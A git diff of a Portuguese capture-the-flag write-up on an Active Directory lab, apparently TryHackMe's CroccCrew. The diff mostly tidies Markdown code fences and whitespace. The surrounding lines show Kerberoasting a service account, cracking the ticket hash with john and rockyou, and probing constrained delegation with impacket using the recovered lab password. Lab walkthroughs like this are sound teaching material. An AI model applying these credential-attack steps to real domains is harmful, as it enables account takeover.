@@ -308,7 +308,7 @@ HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021
 
 ```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
-└─$ sudo net time set -S 10.10.255.206                                                                           255 ⨯
+└─$ sudo net time set -S 10.10.255.206
 [sudo] password for hastur: 
 ```
 
@@ -322,8 +322,6 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
 --------------------  --------------  --------  --------------------------  --------------------------  -----------
 HTTP/dc.cooctus.corp  password-reset            2021-06-08 18:00:39.356663  2021-06-08 17:46:23.369540  constrained 
-
-
 
                                                                                                                      
 ┌──(hastur㉿hastur)-[~/CroccCrew]
@@ -341,7 +339,7 @@ $krb5tgs$23$*password-reset$COOCTUS.CORP$cooctus.corp/password-reset*$856443556e
 
 Podemos tentar quebrá-la com o `john`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
@@ -367,11 +365,11 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
 [-] Probably SPN is not allowed to delegate by user password-reset or initial TGT not forwardable
 
-```bash
+```
 Aparentemente este `SPN` não é habillitado para delegar um TGT silver ticket para este usuário.
 Podemos verificar se existe algum SPN habilitado a delegar, com o `impacket-findDelegation.py`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/CroccCrew]
 └─$ python3 /usr/share/doc/python3-impacket/examples/findDelegation.py cooctus.corp/password-reset:resetpassword -dc-ip 10.10.255.206
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
